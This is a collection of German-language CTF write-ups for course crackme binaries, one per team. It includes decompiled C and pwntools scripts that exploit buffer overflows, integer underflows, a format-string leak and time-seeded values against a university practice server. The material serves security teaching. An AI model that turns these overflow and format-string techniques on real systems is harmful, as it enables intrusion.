
# Team 14


```text
Beschreibung
Multistage Exploits..

```
Stufe 1:
```
Es wird nach der Faktorisierung von X * Y = 2023 gefragt, wobei X und Y eingegeben werden müssen. Natürlich kann man nicht einfach 1 und 2023 eingeben, wäre ja zu einfach. Es existiert keine weitere Faktorisierung, da 2023 eine Primzahl ist. Daher muss ein Integer-Overflow / Underflow verwendet werden.

Wir wählen:
4294967295 + 2004 = 4294969299 (2004 statt 2003, weil 0 existiert)

-> 10071 426469 (Primfaktorzerlegung..)
```
Stufe 2:
```
Normaler Check mit Bufferoverflow, eine Variable muss 0xdeadbeef sein. Wir müssen also 10 Zeichen eingeben und dann 0xdeadbeef im richtigen Encoding angeben (jetzt mal ernsthaft, wer kann denn bitte schon little endian auf den ersten Versuch richtig eingeben, danke dass ihr es printet).
```
Stufe 3:
```
Currenttime muss in Sekunden umgerechnet werden, dann ein bisschen geshiftet werden. Wir replizieren es lokal und geben den Wert ein. Hier war das Problem, dass die Serverzeit unterschiedlich ist, wodurch wir lokal das Offset bestimmen und dann schnell nochmal lösen (in der gleichen Sekunde).
Siehe Script.
```
```python
from pwn import *
import time

pty = process.PTY

# context.log_level = 'debug'
p = process("./team_14", stdin=pty, stdout=pty)
# p = remote("tank.informatik.hs-mannheim.de", 3114)

# prime factorization
p.sendlineafter(b"?", b"10071 426469")

# stufe 2
p.sendlineafter(b"?", b"AAAAAAAAAA\xEF\xBE\xAD\xDE")

# stufe 3
currtime = int(time.time())
currtime = currtime ^ (currtime >> 0xc)
currtime = currtime ^ (currtime << 0x19)
currtime = currtime ^ (currtime >> 0x1b)

p.sendlineafter(b"?", str.encode(str(currtime)))
```
Script angepasst damit es automatisch das server time offset crackt:
```python
from pwn import *
import time

pty = process.PTY

# context.log_level = 'debug'
# p = process("./team_14", stdin=pty, stdout=pty)

def crack(curr, goal):
    i = 0
    while True:
        tmp = curr + i
        tmp = tmp ^ (tmp >> 0xc)
        tmp = tmp ^ (tmp << 0x19)
        tmp = tmp ^ (tmp >> 0x1b)
        print(i, tmp, goal)
        if tmp == goal:
            return i

        tmp = curr - i
        tmp = tmp ^ (tmp >> 0xc)
        tmp = tmp ^ (tmp << 0x19)
        tmp = tmp ^ (tmp >> 0x1b)
        if tmp == goal:
            return -i

        i = i + 1

while True:
    p = remote("tank.informatik.hs-mannheim.de", 3114)

    # prime factorization
    p.sendlineafter(b"?", b"10071 426469")

    # stufe 2
    p.sendlineafter(b"?", b"AAAAAAAAAA\xEF\xBE\xAD\xDE")

    # stufe 3
    currtime = int(time.time()) # server time..
    tmp = currtime
    currtime = currtime ^ (currtime >> 0xc)
    currtime = currtime ^ (currtime << 0x19)
    currtime = currtime ^ (currtime >> 0x1b)

    p.sendlineafter(b"?", str.encode(str(currtime)))
    p.recvuntil(b"an ")
    goaltime = p.recvall().decode()[:-1]
    timeoffset = crack(tmp, int(goaltime[:-1]))

    # clean coding bla bla bla
    p = remote("tank.informatik.hs-mannheim.de", 3114)

    # prime factorization
    p.sendlineafter(b"?", b"10071 426469")

    # stufe 2
    p.sendlineafter(b"?", b"AAAAAAAAAA\xEF\xBE\xAD\xDE")

    # stufe 3
    currtime = int(time.time()) + timeoffset # server time..
    print("New time", currtime)
    currtime = currtime ^ (currtime >> 0xc)
    currtime = currtime ^ (currtime << 0x19)
    currtime = currtime ^ (currtime >> 0x1b)

    p.sendlineafter(b"?", str.encode(str(currtime)))
    flag = p.recvall().decode()
    print(flag)

    if "FLAG{" in flag:
        break



FLAG{climbing_the_mountain}

```

# Team 13
```
Beschreibung
Schritt 1:
Einfach das, was an der Wand steht, mit "brainbrainbrain" xor'en, Ergebnis: xorgenius!

Schritt 2:
Benutzername und Passwort stehen in der jeweiligen Methode als Hexadezimalcode, Benutzername = Dev, Passwort = 1337 ABER

Schritt 3:
Es wird eine andere Variable benutzt --> ein Bufferoverflow wird bei einem der Eingaben benötigt.
Da der Benutzername komplett egal ist, muss das Passwort gefälscht werden.

Dabei fällt auf, dass die ersten drei Zeichen als Benutzername genommen werden müssen (muss Dev sein), dann muss der Stack mit 8 Zeichen überbrückt werden und der Wert 1337 im Speicher abgelegt werden.

Benutzername: egal
Passwort: DevAAAAAAAA1337

(oder irgendein beliebiges Zeichen statt A)

Anschließend erhalten wir die Flagge.

Bestätigung des Passworts nicht mit ENTER, SONDERN MIT CTRL + D!!
FLAG{FLAG{FLAG{FLAG{FLAG}}}}
```

# Team-11
```
## C

***main Funktion***

```c
int main(void) {
  undefined *puVar1;
  int iVar2;
  time_t tVar3;
  size_t sVar4;
  char random_number [10];
  char string_buffer_overflow [10];
  undefined8 local_4e;
  undefined2 local_46;
  undefined local_44;
  char strcmp_condition_1 [10];
  char local_39;
  char *local_28;
  int local_20;
  ulong strcmp_condition_2;
  
  setup();
  tVar3 = time((time_t *)0x0);
  srand((uint)tVar3);
  strcmp_condition_2._0_4_ = genRandomSuperKey(0x14);
  
  // first input in checkIfRobot() serves as a captcha, to prevent brute-force attacks with scripts
  local_20 = checkIfRobot();
  if (local_20 == 0) {
     putchar(10);
     local_4e = 0x20656d6f636c6557;
     local_46 = 0x7325;
     local_44 = 0;
     printf("Type your name [max 9 chars]: ");
     
     // second input to overflow strcmp_condition_1 with value of string_to_win "chipichipi"
     fgets(string_buffer_overflow,255,stdin);
     fgets(string_buffer_overflow,255,stdin);
     printf((char *)&local_4e,string_buffer_overflow,(ulong)(uint)strcmp_condition_2);
     local_39 = '\0';

     // string_to_win is global variable with value "chipichipi"
     iVar2 = strcmp(strcmp_condition_1,string_to_win);
     if (iVar2 == 0) {
       puts("\nCongrats you entered a secret area");
       printf("Guess what number I am thinking of [0-20]: ");

       // third input probably to overflow strcmp_condition_2
       // strcmp_condition_2 then gets inserted into random_number
       // random_number is then compared with string_buffer_overflow
       __isoc99_scanf("%s",string_buffer_overflow);
       sprintf(random_number,"%d",(ulong)(uint)strcmp_condition_2);
       iVar2 = strcmp(random_number,string_buffer_overflow);
       if (iVar2 == 0) {
          puts("\nHi Boss");
          win();
          putchar(10);
       }
       else {
          puts("\nWhat a smart guess");
          printf("Here is your flag: ");
          puVar1 = KEY;
          sVar4 = strlen(FLAG);
          local_28 = (char *)xor_decrypt(FLAG,sVar4 & 0xffffffff,puVar1);
          printFlag(local_28);
          putchar(10);
       }
     }
     else {
       puts("\nThis APP is work in progress try again later...");
     }
  }
  else {
     puts("BOT");
  }
  return 0;
}
```

***checkIfRobot Funktion***

```c
void checkIfRobot(void) {
  char result_char [10];
  char user_input [5];
  uint second_number;
  uint first_number;
  int local_14;
  char operator;
  uint result_int;
  
  local_14 = genRandomSuperKey(3);
  first_number = genRandomSuperKey(100);
  second_number = genRandomSuperKey(100);
  operator = '+';
  result_int = second_number;
  if (local_14 == 1) {
    result_int = -second_number;
    operator = '-';
  }
  result_int = result_int + first_number;
  if (local_14 == 2) {
    result_int = first_number * second_number;
    operator = '*';
  }
  printf("Solve this test: %d %c %d = ",(ulong)first_number,(ulong)(uint)(int)operator,
         (ulong)second_number);
  __isoc99_scanf(&%s,user_input);
  sprintf(result_char,"%d",(ulong)result_int);
  strcmp(result_char,user_input);
  return;
}
```

## 1

Bei der ersten Eingabe in der checkIfRobot Funktion muss eine Mathe Aufgabe gelöst werden. 
Dabei werden zufällig zwei Zahlen zwischen 1 und 100 verwendet sowie ein zufälliger Operator +, - oder *.
Der Sinn hinter dieser Eingabe ist vermutlich ein Captcha, um Bruteforce/Fuzzing Angriffe mittels eines Skripts zu verhindern.
Falls das Ergebnis richtig eingegeben wurde gelangt man zur nächsten Eingabe.

```bash
$ ./crackme_11
Solve this test: 97 - 6 = 91

Type your name [max 9 chars]:
```

## 2

Die zweite Eingabe hat eine Buffer Overflow Schwachstelle, da 255 Zeichen mittels `fgets(string_buffer_overflow,255,stdin);` eingelesen werden, das Ziel jedoch nur 10 Zeichen Platz hat. 

Die Variable `char string_buffer_overflow [10];` wird zuerst mit den 10 Werten 12345678901234567890 gefüllt danach wird der 11 Zeichen lange String "Welcome %s\0" bestehend aus den Variablen `undefined8 local_4e;`, `undefined2 local_46;` und `undefined local_44;` mit den Werten 12345678901 gefüllt, zuletzt wird `char strcmp_condition_1 [10];` mit dem Wert "chipichipi" der globalen Variable `string_to_win`, welche im strcmp verwendet wird befüllt.

Zusammen ergibt dies für die zweite Eingabe "123456789012345678901chipichipi" um zur letzten Eingabe in der "secret area" zu gelangen.

```bash
$ ./crackme_11
Solve this test: 97 - 6 = 91

Type your name [max 9 chars]: 123456789012345678901chipichipi
12345678901chipichipi

Congrats you entered a secret area
Guess what number I am thinking of [0-20]:
```

## 3

Zu unserem Vorteil enthält der von uns vorhin betrachtete Codeabschnitt die folgende Zeile Code:


```
printf((char *)&printed_string,user_input,(ulong)rand_value);
```

Da außerdem printed_string in dem von uns überschreibbar Abschnitt liegt, können wir den in die Konsole dargestellten String so anpassen, dass er uns die zufällige Geheimzahl verrät:

```
$ ./crackme_11                                                     
Solve this test: 5 + 5 = 10

Type your name [max 9 chars]: 123456789000000000000chipichipi
Type your name [max 9 chars]: 1234567890%s-$d-00000chipichipi
1234567890%s-$d-00000chipichipi
16-00000chipichipi

Congrats you entered a secret area
Guess what number I am thinking of [0-20]: 16

Hi Boss
FLAG{chipi chipi chapa chapa dubi dubi daba daba}
```
#  Team 09

```



 
## Beschreibung  
Ich habe ehrlich gesagt keine Ahnung was dieses brainfuck interpreter ding in der encrypt() machen soll.
 
```c
undefined8 main(void)
 
{
  int cmpresult;
  size_t keylength;
  long in_FS_OFFSET;
  undefined key [4];
  int local_60;
  int local_5c;
  void *someBuff;
  undefined2 magic;
  undefined local_49;
  undefined userInput [40];
  long canary;
 
  canary = *(long *)(in_FS_OFFSET + 0x28);
  local_60 = 0x13;
  keylength = strlen(::key);
  local_5c = (int)keylength;
  someBuff = malloc(0x13);
  magic = 0x7266;
  local_49 = 0x70;
  memset(userInput,0,0x20);
  printf("Enter message: ");
  __isoc99_scanf(&readString,userInput);
  printf("Enter key: ");
  __isoc99_scanf(&readDouble,key);
  keylength = strlen((char *)&magic);
  encrypt((char *)&magic,(int)keylength);
  cmpresult = strcmp((char *)&magic,"secure");
  if (cmpresult == 0) {
    xor_crypt(someBuff,crypt,(long)local_60,::key,(long)local_5c);
    print_array(someBuff,(long)local_60);
  }
  else {
    puts("Done.");
  }
  if (canary != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}
```
 
magic und local haben den String "frp" (fr + p), die Nutzereingabe wird an diesen angehängt in der encrypt-Funktion. Dort wird weiter der String mit einer caesar-Ciphre verschlüsselt (Shift 13). Unser Ziel ist es, dass die Nutzereingabe mit frp das Wort "secure" ergibt. Dies ist möglich, da "frp" um 13 verschoben "sec" ist, wir müssen also nur noch "ure" einfügen. Dafür verschieben wir das ganze auch um 13 (DoppelROT13) und erhalten "her".
 
Nach der Eingabe:  
```bash
./team_09
Enter message: her
Enter key: 13
FLAG{the_real_flag}
```
 
erhalten wir die Flag.
## Flag  
FLAG{LuckyNumberSlevin}
```
```
#  Team 04

## Beschreibung
Der Code wird in dieser Aufgabe nicht eingefügt, da dieser ziemlich lange ist.
Es gibt eine Funktion shuffle in der Main-Methode, welche das erste Zeichen eines Strings durch das letzte ersetzt (und dann tauscht), das zweite durchs vorletzte etc.

Führen wir dies einmal von Hand auf die angegebenen Hex-Werte aus erhalten wir _nicht_ die Flag, sondern:  
`I_know_Y0U_C4nt_Crack_it` wird zu `ti_kcarC_tn4C_U0Y_wonk_I`

Die Funktion encrypt() caesar-verschlüsselt den vorgegebenen String mit einem Shift um 10. 
Die Funktion encryptDecrypt() verschlüsselt jedes Zeichen eines Strings mit 0x4b.  
Die Funktion decrypt() verwendet den gleichen Code wie team_03, übergibt jedoch ein paar weitere Parameter. Auch hier wird eine Caesar-Ciphre implementiert.

Wir können also das umgedrehte Passwort caesar-verschlüsseln um 10, erhalten `ds_umkbM_dx4M_E0I_gyxu_S`, also die Eingabe für das Passwort. Für die Ausführung und den Ausgabewert siehe angehängtes Script.

## Script
```python
nojo@Nojo:~/ree/team01$ ./team_04
Enter the password: ds_umkbM_dx4M_E0I_gyxu_S
4Ole�Flag{Humpty Shuffly BOOO}
## Flag
Flag{Humpty Shuffly BOOO}
```
```
#  Team 03

## Notiz
Oh my god, ist das cute gemacht, Platz 1 by far.
 
## Lösung
 
Es gibt einen Cheatmode, den man über einen Bufferoverflow beim strcp ausnutzen kann (username in einen 10er Buffer), deswegen können wir dort einfach 14 Zeichen eingeben.
 
Cheatmode enablen: nojonojonocheat --> buffer overflow beim strcp vom username in den 10er buffer
-> Cheatmode ist aktiviert
 
Außerdem muss man noch ein Passwort herausfinden, der Input wird in eine Funktion crypter() geschmissen, diese Caesar-verschlüsselt den String mit einem Shift von 10. Somit können wir die Hex-Werte manuell um 10 verschieben und erhalten das Passwort "Sternenstaubdrache", welches wir anschließend wie im Script gezeigt verwenden können, um das Spiel zu starten.
 
```c
 
void gameLoop(undefined8 param_1,long cheatmode)
 
{
  int selected;
  uint nonCheatSkillup;
  int skillUpAmount;
  int command;
  uint local_28;
  uint turn;
  uint j;
  uint i;
  uint availableSkillpoints;
  uint dmg;
  uint vitality;
  uint strength;
 
  strength = 0;
  vitality = 0;
  local_28 = 400;
  dmg = 10;
  availableSkillpoints = 10;
  while( true ) {
    system("clear");
    puts("-------------------------------------------------------");
    printf("Available Attribute Points: %d\n\n",(ulong)availableSkillpoints);
    puts("Current Stats:");
    printf("Strength: %u\n",(ulong)strength);
    printf("Vitality: %u\n",(ulong)vitality);
    puts("-------------------------------------------------------");
    puts("1. Add points to Strength");
    puts("2. Add points to Vitality");
    puts("3. Fight Endboss");
    puts("4. Quit");
    puts("-------------------------------------------------------");
    printf("Enter your choice (1/2/3/4): ");
    while ((selected = __isoc99_scanf(&DAT_00102eac,&command), selected != 1 ||
           ((((command != 1 && (command != 2)) && (command != 3)) && (command != 4))))) {
      puts("Invalid input. Please enter a valid choice.");
      do {
        selected = getchar();
      } while (selected != 10);
    }
    if (command == 4) {
      system("clear");
                    /* WARNING: Subroutine does not return */
      exit(0);
    }
    if (command == 3) break;
    if (cheatmode == 0x7461656863) {
      printf("Enter the number of points to add: ");
      while ((selected = __isoc99_scanf(&DAT_00102f0e,&skillUpAmount), selected != 1 ||
             ((int)availableSkillpoints < skillUpAmount))) {
        puts("Invalid input. Please enter a valid number of points.");
        do {
          selected = getchar();
        } while (selected != 10);
      }
      availableSkillpoints = availableSkillpoints - skillUpAmount;
      if (command == 1) {
        strength = strength + skillUpAmount;
      }
      else if (command == 2) {
        vitality = vitality + skillUpAmount;
      }
    }
    else {
      printf("Enter the number of points to add: ");
      while ((selected = __isoc99_scanf(&DAT_00102f0e,&nonCheatSkillup), selected != 1 ||
             (availableSkillpoints < nonCheatSkillup))) {
        puts("Invalid input. Please enter a valid number of points.");
        do {
          selected = getchar();
        } while (selected != 10);
      }
      availableSkillpoints = availableSkillpoints - nonCheatSkillup;
      if (command == 1) {
        strength = strength + nonCheatSkillup;
      }
      else if (command == 2) {
        vitality = vitality + nonCheatSkillup;
      }
    }
  }
  if (strength != 0) {
    for (i = 0; i < strength; i = i + 1) {
      selected = getRandom();
      dmg = dmg + selected * 5;
      if (999 < dmg) break;
    }
  }
  if (vitality != 0) {
    for (j = 0; j < vitality; j = j + 1) {
      selected = getRandom();
      player_hp = player_hp + selected * 5;
      if (4999 < (int)player_hp) break;
    }
  }
  system("clear");
  puts("-------------------------------------------------------");
  puts("Final Stats:");
  printf("Strength: %u\n",(ulong)strength);
  printf("Vitality: %u\n",(ulong)vitality);
  printf("Player HP: %i\n",(ulong)player_hp);
  printf("Player DMG: %i\n",(ulong)dmg);
  printf("Available Points: %i\n",(ulong)availableSkillpoints);
  puts("-------------------------------------------------------");
  puts("Battle Starts...\n");
  sleep(5);
  printPlayerVsEndboss();
  sleep(3);
  system("clear");
  turn = 1;
  do {
    if ((turn & 1) == 0) {
      puts("Player attacks back with legendary Sword Excalibur\n");
      printf("Attack DMG=%d\n\n",(ulong)dmg);
      printSword();
      endboss_hp = endboss_hp - dmg;
      sleep(3);
      system("clear");
      printPlayerVsEndboss();
      sleep(3);
      system("clear");
      if (endboss_hp < 1) {
        win();
                    /* WARNING: Subroutine does not return */
        exit(0);
      }
    }
    else {
      puts("Dragon attacks with Fireeeee");
      printf("Attack DMG=%d\n\n",(ulong)local_28);
      printFireAttack();
      player_hp = player_hp - local_28;
      sleep(3);
      system("clear");
      printPlayerVsEndboss();
      sleep(3);
      system("clear");
      if ((int)player_hp < 1) {
        printGameOver();
                    /* WARNING: Subroutine does not return */
        exit(0);
      }
    }
    turn = turn + 1;
  } while( true );
}
```
 
Das aktiviert eine Unterscheidung, der Code ist nahezu identisch bis auf das (int)-Cast. Dadurch kann man eine negative Zahl eingeben bei der Statverteilung und somit 5k HP und 1k DMG bekommen (integer underflow durch den Cast). Der Rest spielt sich von alleine, man gewinnt das Spiel und erhält die Flag. Super cute gemacht. Unten ist ein Script, was das ganze automatisiert. Weitere Erklärungen werden für nicht notwendig befunden, da keine weiteren Exploits angewandt werden.
 
## Script
```python
from pwn import *
 
pty = process.PTY
# p = process("./team_03", stdin=pty, stdout=pty)
p = remote("tank.informatik.hs-mannheim.de", 3103)
# context.log_level = 'debug'
 
p.sendlineafter(b": ", b"AAAAAAAAAAcheat")
p.sendlineafter(b": ", b"Sternenstaubdrache")
 
p.sendlineafter(b"): ", b"1")
p.sendlineafter(b": ", b"-1")
p.sendlineafter(b"): ", b"2")
p.sendlineafter(b": ", b"-1")
p.sendlineafter(b"): ", b"3")
 
# p.recvuntil("FLAG{")
flag = p.recvall().decode()
 
print(flag)


## Flag
FLAG{dr4g0n_sl4y3r}
```




